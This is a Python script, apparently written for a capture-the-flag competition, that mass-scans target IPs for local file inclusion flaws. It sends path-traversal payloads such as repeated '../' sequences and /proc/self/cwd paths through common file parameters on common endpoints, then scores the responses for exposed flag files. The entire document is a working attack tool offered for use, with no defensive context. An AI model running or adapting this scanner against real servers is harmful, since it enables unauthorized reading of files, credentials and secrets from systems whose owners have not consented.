#!/usr/bin/env python3
import re, sys, json, itertools, urllib.parse, requests
requests.packages.urllib3.disable_warnings()

PORT=5000
TIMEOUT=4
WORDLIST_PATHS = [
    "/view","/download","/read","/file","/open","/img","/image","/render","/pdf","/doc","/api/view","/api/download","/"
]
PARAMS = ["file","path","name","doc","page","template","tpl","url","u","target","resource"]
PAYLOADS = [
    "/app/flag",
    "/proc/self/cwd/flag",
    "../" * 8 + "app/flag",
    "../../" * 8 + "flag",
]
HEADERS={"User-Agent":"lfi-hunt/1.0","Accept":"*/*"}

def try_one(ip, method, endpoint, param, payload):
    url=f"http://{ip}:{PORT}{endpoint}"
    try:
        if method=="GET":
            r=requests.get(url, params={param:payload}, headers=HEADERS, timeout=TIMEOUT, verify=False, allow_redirects=True)
        else:
            r=requests.post(url, data={param:payload}, headers=HEADERS, timeout=TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return None
    text=r.text
    # 轻量判定：命中 flag 线索/hex/known words
    score=0
    hints=[]
    if re.search(r'flag', text, re.I): score+=2; hints.append("has 'flag'")
    if re.search(r'[0-9a-f]{40,64}', text): score+=1; hints.append("hex40/64")
    if r.status_code==200: score+=1
    return {"code":r.status_code,"len":len(text),"preview":text[:200].replace('\n',' ') ,"url":r.url,"score":score,"hints":hints}

def main():
    out=open("lfi_report.txt","w",encoding="utf-8")
    with open("targets.txt") as f:
        targets=[x.strip() for x in f if x.strip()]
    print("🔍 LFI hunting... 输出: lfi_report.txt")
    for ip in targets:
        print("="*28, file=out); print(f"📡 {ip}", file=out)
        for endpoint in WORDLIST_PATHS:
            for method in ["GET","POST"]:
                for param,payload in itertools.product(PARAMS,PAYLOADS):
                    r=try_one(ip,method,endpoint,param,payload)
                    if not r: continue
                    if r["score"]>=2:
                        print(f"[HIGH] {method} {r['url']}  param={param} payload={payload}  code={r['code']} len={r['len']}  hints={','.join(r['hints'])}", file=out)
                        print("      preview:", r["preview"], file=out)
                    elif r["score"]==1:
                        print(f"[LOW ] {method} {r['url']}  param={param} payload={payload}  code={r['code']} len={r['len']}", file=out)
    out.close()
    print("✅ done. 查看 lfi_report.txt")

if __name__=="__main__":
    main()
